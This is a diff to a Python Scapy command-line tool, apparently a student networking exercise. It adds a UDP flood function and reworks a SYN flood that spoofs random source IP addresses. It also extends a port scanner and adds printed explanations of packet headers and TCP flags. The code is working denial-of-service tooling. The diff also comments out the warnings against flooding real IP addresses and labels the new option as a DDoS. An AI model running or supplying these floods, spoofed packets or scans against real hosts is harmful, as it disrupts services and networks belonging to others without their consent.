@@ -104,7 +104,7 @@ class State():
 def ICMP_Ping_Flood(host, cmds):
 	"""
 	Sends a flood of pings n pings set by amount using the ICMP protocols.
-	Remember that a host may not respond to a ping (ICMP) request even if the host name is valid.
+	Remember that a host may not respond to a ping (ICMP) request even if 		the host name is valid.
 	"""
 	# defaults amount to 1 if user didn't specify an amount of pings
 	try:
@@ -137,10 +137,28 @@ def randomIP():
 def randInt():
 	x = random.randint(0, 255)
 	return x
+	
+def upd_attack(host, cmds):
+	""" 
+	sends UDP packets to host on port of amount
+	"""
+	try:
+		port = int(cmds[2])
+		amount = 1
+		try: 
+			amount = int(cmds[3])
+		except IndexError as i:
+			amount = 1
+		for i in range(0, amount):
+			send(IP(dst=host)/UDP(dport=port))
+	except Exception as e:
+		print('something went wrong in udp_attack ', e)
+		print('cmds: ', cmds)
 
 def SynAckAttack(host, cmds):
 	"""
 	sends syn packets to the host_and_ports list
+	prints out explanations of packet structure
 	:return:
 	"""
 	print("\n###########################################")
@@ -156,11 +174,7 @@ def SynAckAttack(host, cmds):
 		ports = [int(p) for p in ports.split('.')]
 	except IndexError:
 		ports = []
-	except Exception as e:
-		print('in ping flood: ')
-		print('something was wrong with arguments: ', cmds)
-		print('\n', e)
-		return
+
 	# hosts = state.host_and_ports.keys()
 	# ports = []
 	if not ports:
@@ -168,29 +182,79 @@ def SynAckAttack(host, cmds):
 		print("[cmds]: ", cmds)
 		print()
 		return
-	# for host in hosts:
-	print(f"# Attacking Target: {host}")
-	for hostPort in ports:
-		for x in range(0, amount):
-			# Build a random packet
-			s_port = randInt()
-			s_eq = randInt()
-			w_indow = randInt()
+	try:
+			# for host in hosts:
+	#	print(f"# Attacking Target: {host}")
+		for hostPort in ports:
+			for x in range(0, amount):
+				# Build a random packet
+				# s_port = randInt()
+				# s_eq = randInt()
+				# w_indow = randInt()
 
-			IP_Packet = IP()
-			IP_Packet.src = randomIP()
-			IP_Packet.dst = host
+				IP_Packet = IP()
+				IP_Packet.src = randomIP()
+				IP_Packet.dst = host
 
-			TCP_Packet = TCP()
-			TCP_Packet.sport = s_port
-			TCP_Packet.dport = hostPort
-			TCP_Packet.flags = "S"
-			TCP_Packet.seq = s_eq
-			TCP_Packet.window = w_indow
+				TCP_Packet = TCP()
+				# TCP_Packet.sport = s_port
+				TCP_Packet.dport = hostPort
+				TCP_Packet.flags = "S"
+				# TCP_Packet.seq = s_eq
+				# TCP_Packet.window = w_indow
 
-			# Send the packet
-			send(IP_Packet/TCP_Packet)
+				# Send the packet
+				send(IP_Packet/TCP_Packet)
+		print()
+		print('***')
+		print("packets explanation:")
+		print("sent %s packets of this form: " % amount)
+		IP_Packet.show()
+		print("ihl: internet header length")
+		print("tos: type of service")
+		print("frag: fragement offset")
+		print("ttl: time to live [s]")
+		print("proto: Protocol num, 0 = IPv6")
+		print("chksum: check sum for error checking")
+		print("***")
+		print('TCP SYN packet: ')
+		TCP_Packet.show()
+		# get grasp of all flags set in the Scapy TCP packet
+		# obv, it's going to just be SYN, set with 'S'
+		flags_vals = {
+			'F': 0,
+			'S': 0,
+			'R': 0,
+			'P': 0,
+			'A': 0,
+			'U': 0,
+			'E': 0,
+			'C': 0,
+		}
+		flags = {
+			'F': 'FIN',
+			'S': 'SYN',
+			'R': 'RST',
+			'P': 'PSH',
+			'A': 'ACK',
+			'U': 'URG',
+			'E': 'ECE',
+			'C': 'CWR',
+			}
+		for f in TCP_Packet.sprintf('%TCP.flags%'):
+			flags_vals[f] = 1
+		print('flags set in TCP SYN packet')
+		print([flags[x] for x in TCP_Packet.sprintf('%TCP.flags%')])
+		print(flags_vals)
+	except Exception as e:
+		print('in ping flood: ')
+		print('something was wrong with arguments: ', cmds)
+		print('\n', e)
+		return
 
+		
+		
+		
 def scanning(args, state):
 	"""
 	scans host specified by user
@@ -198,7 +262,11 @@ def scanning(args, state):
 	"""
 	host = args[1]
 	start_port = int(args[2])
-	end_port   = int(args[3])
+	try:
+		end_port   = int(args[3])
+	# handle if user specified only one port, not a range
+	except IndexError as i:
+		end_port = start_port
 	assert start_port < end_port
 	port_range=range(start_port, end_port+1)
 
@@ -251,6 +319,8 @@ def usage(print_code_name=True):
 			"            Requires three args, <host> and <port start> and <port end>")
 	print("-syn         - flood a target host with an SYN ACK flood.\n"
 		  "              Requires two arguments: <host>, <ports> in format of 'p1,p2,p3,...,pn'. Has optional third argument, <amount> ")
+	print("-udp         - DDOS a target host with UPD Packets.\n"
+		  "               Requires 3 arguments: <host>, <port>, <amount> (default =1)")
 	print("-a           - save hosts and open ports to a .txt file")
 	print("-r           - read in hosts and open ports from a .txt file")
 	print()
@@ -258,10 +328,10 @@ def usage(print_code_name=True):
 	print("Examples: ")
 
 	print("-l")
-	print("-s 192.168.0.1 0 500")
-	print("-pf  192.168.0.1   (optional) <num of pings>")
-	print("-syn 192.168.0.1   (optional) <num of pings>")
-
+	print("-s   192.168.0.1 0 500        # host, port range")
+	print("-pf  192.168.0.1  100         # host, num of pings (optional) <num of pings>")
+	print("-syn 192.168.0.1  80,8080 100 # host, ports comma delimited, and amount (optional)")
+	print("-udp 192.168.0.1  80 100      # host, port, amount (optional, defaults to 1)")
 	# sys.exit(0)
 
 
@@ -290,11 +360,13 @@ if __name__ == "__main__":
 				list_ports(state)
 			elif cmds[0] == "-pf":
 				# call for a ping flood
-				print("WARNING: make sure you're not actually flooding a 'real' IP address")
+				# print("WARNING: make sure you're not actually flooding a 'real' IP address")
 				ICMP_Ping_Flood(cmds[1], cmds)
 			elif cmds[0] == '-syn':
-				print("WARNING: make sure you're not actually flooding a 'real' IP address")
+				# print("WARNING: make sure you're not actually flooding a 'real' IP address")
 				SynAckAttack(cmds[1], cmds)
+			elif cmds[0] == '-udp':
+				upd_attack(cmds[1], cmds)
 			elif cmds[0] in ('-q', '-Q'):
 				sys.exit(0)
 			elif cmds[0] == '-a':
